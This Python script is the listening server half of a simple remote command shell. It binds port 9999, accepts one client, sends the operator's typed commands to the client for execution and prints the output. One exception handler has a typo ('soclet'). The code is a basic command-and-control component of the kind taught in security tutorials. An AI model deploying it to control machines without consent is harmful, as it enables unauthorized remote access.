import socket#for creating a socket
import sys




#creating socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()#function for creating  a socket
    except soclet.error as msg:
        print("Socket creation error ",str(msg))    

#binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port"+str(port))
        s.bind((host,port))#binding function
        s.listen(5) 
    except socket.error as msg:
        print("socket binding error"+str(msg)+"\n"+"Retrying")    

#Establishing connection with client while listening
def socket_accept():
    connection,address=s.accept()
    print("Connection has been established [IP address= ",address ," ,Port=", port,"]")
    sending_commands(connection)#commands to be performed within the connected client are send through this function 

#sending commands
def sending_commands(connection):
    while True:
        command=input()
        if command=="quit":
            connection.close()#closing the connection
            s.close()#closing the socket
            sys.exit()#closing the command prompt
        if len(str.encode(command))>0:#if user doesnt type anything into the input the lenth will be zero so no need to execute the function 
            connection.send(str.encode(command))#sending data after encoding it into bytes          
            client_response=str(connection.recv(1024),"utf-8")#recieving data is converted from byte  to string format  , data is send in like chunks so 1024 can be said as a chunk
            print(client_response,end="")#end="" gets to the new line

def main():
    create_socket()
    bind_socket()
    socket_accept()



main()